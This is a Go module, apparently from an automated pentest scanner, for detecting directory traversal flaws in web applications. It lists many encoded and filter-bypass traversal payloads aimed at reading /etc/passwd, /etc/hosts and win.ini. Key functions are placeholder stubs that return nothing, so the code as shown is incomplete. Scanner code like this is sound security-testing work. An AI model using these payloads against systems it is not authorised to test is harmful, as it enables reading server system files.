package modules

import (
	"context"
	"fmt"
	"net/http"
	"strings"

	"github.com/autonomouspen/scanner/internal/scanner"
)

type DirectoryTraversalScanner struct{}

func NewDirectoryTraversalScanner() *DirectoryTraversalScanner {
	return &DirectoryTraversalScanner{}
}

func (s *DirectoryTraversalScanner) Scan(ctx context.Context, target *Target, results chan<- *scanner.Vulnerability) {
	// Implementation for directory traversal scan
}

func (s *DirectoryTraversalScanner) detectTraversal(resp *http.Response) (bool, string) {
	// In a real implementation, you would need to read the response body.
	// This is just a placeholder.
	body := ""

	// Linux /etc/passwd indicators
	if strings.Contains(body, "root:x:0:0:") || strings.Contains(body, "root:*:0:0:") {
		return true, "/etc/passwd"
	}

	// Windows win.ini indicators
	if strings.Contains(body, "[fonts]") || strings.Contains(body, "[extensions]") {
		return true, "windows/win.ini"
	}

	// /etc/hosts indicators
	if strings.Contains(body, "127.0.0.1") && strings.Contains(body, "localhost") {
		return true, "/etc/hosts"
	}

	// PHP error messages
	phpErrors := []string{
		"failed to open stream",
		"include(): Failed opening",
		"require(): Failed opening",
		"No such file or directory",
		"Permission denied",
	}

	for _, err := range phpErrors {
		if strings.Contains(body, err) {
			return true, "PHP error disclosure"
		}
	}

	return false, ""
}

func (s *DirectoryTraversalScanner) testUnicodeTraversal(ctx context.Context, param *Parameter, results chan<- *scanner.Vulnerability) {
	unicodePayloads := []string{
		// Unicode encodings
		"%u002e%u002e%u002f",
		"%u002e%u002e%u005c",
		"..%u2215",
		"..%u2216",
		"%uff0e%uff0e%u2215",
		"%uff0e%uff0e%u2216",

		// Overlong UTF-8 encodings
		"%c0%2e%c0%2e%c0%af",
		"%c0%ae%c0%ae%c0%af",
		"%c0%2e%c0%2e/",

		// Mixed encodings
		"..%ef%bc%8f",
		"%2e%2e%ef%bc%8f",
	}

	for _, payload := range unicodePayloads {
		fullPayload := payload + "etc/passwd"
		resp := s.sendPayload(param, fullPayload)

		if detected, file := s.detectTraversal(resp); detected {
			vuln := &scanner.Vulnerability{
				Name:     "Directory Traversal (Unicode)",
				Severity: "High",
				Description:  fmt.Sprintf("Successfully read %s", file),
				Evidence: fullPayload,
			}
			results <- vuln
		}
	}
}

func (s *DirectoryTraversalScanner) testFilterBypass(ctx context.Context, param *Parameter, results chan<- *scanner.Vulnerability) {
	bypassPayloads := []string{
		// Double encoding
		"%252e%252e%252f",
		"%252e%252e%255c",

		// 16-bit Unicode encoding
		"%u002e%u002e%u002f",
		"%u002e%u002e%u005c",

		// UTF-8 Unicode encoding
		"%c0%2e%c0%2e%c0%af",
		"%c0%ae%c0%ae%c0%af",

		// Nested traversal
		"....//",
		"....\\\\",
		"..../",
		"....\\",

		// UNC paths (Windows)
		"\\\\localhost\\c$\\windows\\win.ini",
		"//localhost/c$/windows/win.ini",

		// Absolute paths
		"C:\\windows\\win.ini",
		"C:/windows/win.ini",
		"/etc/passwd",

		// URL encoding variations
		"%2e%2e%2f",
		"%2e%2e/",
		"..%2f",
		"%2e%2e\\",
		"..%5c",

		// Case variations
		"..%2F",
		"..%5C",
		"%2E%2E/",
		"%2E%2E\\",
	}

	for _, bypass := range bypassPayloads {
		// Test with common files
		testFiles := []string{"etc/passwd", "windows/win.ini", "etc/hosts"}

		for _, file := range testFiles {
			payload := bypass + file
			resp := s.sendPayload(param, payload)

			if detected, _ := s.detectTraversal(resp); detected {
				vuln := &scanner.Vulnerability{
					Name:     "Directory Traversal (Filter Bypass)",
					Severity: "High",
					Description:  fmt.Sprintf("Filter bypass using %s", bypass),
					Evidence: payload,
				}
				results <- vuln
				break
			}
		}
	}
}

func (s *DirectoryTraversalScanner) testPathNormalization(ctx context.Context, param *Parameter, results chan<- *scanner.Vulnerability) {
	// Test path normalization issues
	normalizationPayloads := []string{
		"/var/www/../../etc/passwd",
		"\\var\\www\\..\\..\\windows\\win.ini",
		"/etc/./passwd",
		"\\windows\\.\\win.ini",
		"/etc/../etc/passwd",
		"\\windows\\..\\windows\\win.ini",
		"///etc/passwd",
		"\\\\\\windows\\win.ini",
	}

	for _, payload := range normalizationPayloads {
		resp := s.sendPayload(param, payload)

		if detected, file := s.detectTraversal(resp); detected {
			vuln := &scanner.Vulnerability{
				Name:     "Directory Traversal (Path Normalization)",
				Severity: "High",
				Description:  fmt.Sprintf("Path normalization bypass allowed reading %s", file),
				Evidence: payload,
			}
			results <- vuln
		}
	}
}

func (s *DirectoryTraversalScanner) sendPayload(param *Parameter, payload string) *http.Response {
	// Implementation for sending a payload
	return nil
}
